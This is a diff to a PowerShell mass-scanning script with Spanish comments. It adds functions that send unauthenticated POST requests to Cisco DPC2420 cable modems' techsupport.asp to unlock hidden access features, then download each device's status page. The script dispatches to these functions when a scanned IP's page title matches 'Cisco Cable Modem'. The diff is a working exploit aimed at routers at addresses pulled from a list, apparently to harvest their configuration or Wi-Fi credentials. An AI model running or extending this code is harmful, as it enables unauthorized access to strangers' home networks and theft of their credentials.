@@ -97,6 +97,27 @@ echo "$ip - Motorola SBG900"
     }
 }
 
+#Desbloquear caracteristicas de wireless de los Cisco DPC2420
+function unlockCisco($ip){
+	curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv1=1" "http://$ip/goform/techsupport.asp" | out-null;
+    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff2=1" "http://$ip/goform/techsupport.asp" | out-null;
+    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv2=1" "http://$ip/goform/techsupport.asp" | out-null;
+    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff=1" "http://$ip/goform/techsupport.asp" | out-null;
+    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv=1" "http://$ip/goform/techsupport.asp" | out-null;
+    curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv16=1" "http://$ip/goform/techsupport.asp" | out-null;
+}
+
+
+#Cisco DPC2420
+function ciscoAuth($ip){
+echo "$ip - Cisco DPC2420" 
+	unlockCisco $ip;
+	unlockCisco $ip;
+	curl --connect-timeout 3 -m 10 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp  | out-null;
+    curl -o $save --connect-timeout 3 -m 60 -s -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: es,en;q=0.9,es-419;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" -H "Referer: http://$ip/webstar.html" -H "Connection: keep-alive" --compressed http://$ip/status.asp;
+    verifyFile
+}
+
 function runScanner(){
 	setup
 	foreach($line in Get-Content .\NATIp.txt) {
@@ -109,7 +130,8 @@ function runScanner(){
 				".*<title>WAN</title>.*" {wan $line; break}
 				".*<title>Residential Gateway Login</title>.*" {motorola $line; break}
 				".*<title>Motorola SBG900</title>.*"  {motorolasbg $line; break}
-
+				".*<TITLE>Cisco Cable Modem</TITLE>.*" {ciscoAuth $line; break}
+				".*<title>Cisco Cable Modem</title>.*"  {ciscoAuth $line; break}
 				default {$title; Break}
 			}
 		}
